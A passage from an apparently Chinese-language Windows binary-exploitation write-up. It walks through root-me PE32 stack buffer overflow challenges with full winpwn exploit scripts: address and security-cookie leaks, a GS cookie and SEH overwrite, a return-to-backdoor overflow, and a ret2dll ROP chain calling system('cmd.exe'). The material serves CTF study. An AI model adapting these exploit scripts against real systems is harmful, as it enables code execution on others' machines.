    #     sh.sendline('cat /flag')
    #     return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        windbgx.attach(sh)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
            PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
            sh.recvuntil('Do you want to know more?')
            sh.sendline('yes')
            sh.recvuntil('Where do you want to know')
            sh.sendline(str(PIE_address + 0x4004))
            security_cookie = get_address(sh=sh,info="[+] Security Cookie IS ",start_string=" value is 0x",end_string="x0A",int_mode=True)
            GS_Cookie = (stack_address + 0x9C) ^ security_cookie
            payload  = 'a' * 0x10
            payload += p32(0x0FFFFFFFE)
            payload += p32(0)
            payload += p32(0x0FFFFFFCC)
            payload += p32(0)
            payload += p32(0xFFFFFFFE)
            payload += p32(PIE_address + 0x138D)
            payload  = payload.ljust(0x78 - 0x10, 'b')
            payload += p32(GS_Cookie)
            payload += 'c' * 0x20
            payload += p32(stack_address + 0xD4)
            payload += p32(PIE_address + 0x1460)
            payload += p32((stack_address + 0x10) ^ security_cookie)
            payload += p32(0)
            payload += 'd' * 0x10
            sh.recvuntil('Do you want to know more?')
            # get_gdb(sh)
            sh.sendline('noo')
            sh.sendline(payload)
            sh.recvuntil('Do you want to know more?')
            sh.sendline('yes')
            sh.recvuntil('Where do you want to know')
            sh.sendline('0')
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        os.system("")
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x05 以[root-me]PE32 – Stack buffer overflow basic为例
###  程序保护检查
发现基本是无保护程序
###  程序漏洞分析
存在一个明显的栈溢出
存在后门函数
###  程序漏洞利用
直接利用常规的栈溢出思路，覆盖返回地址以及`EBP`
###  Final Exploit
    from winpwn import *
    import os
    import traceback
    import sys
    context.log_level='debug'
    # context.arch='amd64'
    context.arch='i386'
    # file_name=ELF('./file_name', checksec = False)
    def get_sh():
        if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE' :
            return remote(sys.argv[2],sys.argv[3])
        else:
            return process("./ch72.exe")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string).strip(end_string),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            print(info + str(hex(return_address)))
        return return_address
    # def get_flag(sh):
    #     sh.sendline('cat /flag')
    #     return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        windbgx.attach(sh)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            payload  = 'a' * 0x14 + p32(0xDEADBEEF)
            payload += p32(0x401000)
            # get_gdb(sh)
            sh.sendline(payload)
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        os.system("")
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x06 以[root-me]Advanced stack buffer overflow为例
###  程序保护检查
###  程序漏洞分析
这个题需要我们在运行时提交一个文件作为餐数，然后会读取其中的内容作为`manage_file`函数的参数传入
然后程序就会将文件的内容读取到局部变量中
但是显然这里没有做很好的长度过滤，这会导致栈溢出的发生。
这一次程序中不再有后门函数以供我们利用，于是我们这次使用`ret2dll`完成利用。
###  程序漏洞利用
**由于程序没有开启`PIE`保护，系统也没有开启`aslr`于是可以不用考虑`Leak`相关地址后程序崩溃的问题，因为相关地址并不会发生任何的改变。**
####  泄露合法文件地址
由于我们触发栈溢出后必然会影响`fclose`的参数，于是我们先行泄露：
    payload  = p32(0) * 100
    open('./payload_0','w').write(payload)
####  泄露DLL加载地址
我们可以利用`printf`函数来泄露并计算`DLL`文件的加载基址。
    payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
    payload += p32(0x00402974) # printf@plt
    payload += p32(0x004016E3) # _manage_file
    payload += p32(0x00406200) # printf@got
    open('./payload_1','w').write(payload)
又可以从`IDA`中看出`DLL`文件位于`msvcrt.dll`，文件位于`C:WindowsSystemSysWOW64`目录下。
于是可以计算出`DLL`加载地址
####  最终完成利用
最终我们直接计算构造ROP即可
###  Final Exploit
    from winpwn import *
    import os
    import traceback
    import sys
    context.log_level='debug'
    # context.arch='amd64'
    context.arch='i386'
    # file_name=ELF('./file_name', checksec = False)
    def get_sh():
        if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE' :
            return remote(sys.argv[2],sys.argv[3])
        else:
            return process("./ch73.exe")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string).strip(end_string),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            print(info + str(hex(return_address)))
        return return_address
    # def get_flag(sh):
    #     sh.sendline('cat /flag')
    #     return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        windbgx.attach(sh)
        if stop :
            raw_input()
    def Attack():
        try:
            # Your Code here
            payload  = p32(0) * 100
            open('./payload_0','w').write(payload)
            payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
            payload += p32(0x00402974) # printf@plt
            payload += p32(0x004016E3) # _manage_file
            payload += p32(0x00406200) # printf@got
            open('./payload_1','w').write(payload)
            payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
            payload += p32(0x76213DC0) # system
            payload += p32(0x004016E3) # _manage_file
            payload += p32(0x761D47A4) # cmd.exe
            open('./payload_2','w').write(payload)
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        os.system("")
        Attack()
## 0x07 参考链接
[【原】超酷的 PowerShell 美化指南 – Lulus](https://zhuanlan.zhihu.com/p/51901035)
[【原】CFG防护机制的简要分析 – f0 _**_](https://xz.aliyun.com/t/2587)
[【原】Windows-pwn解题原理&利用手法详解 – 萝卜](https://www.anquanke.com/post/id/188170)
[【原】HITB GSEC BABYSTACK — win pwn 初探 – Ex](http://blog.eonew.cn/archives/1182)
[【原】Windows PE 第四章 导入表 –
TK13](https://blog.csdn.net/u013761036/article/details/52751849)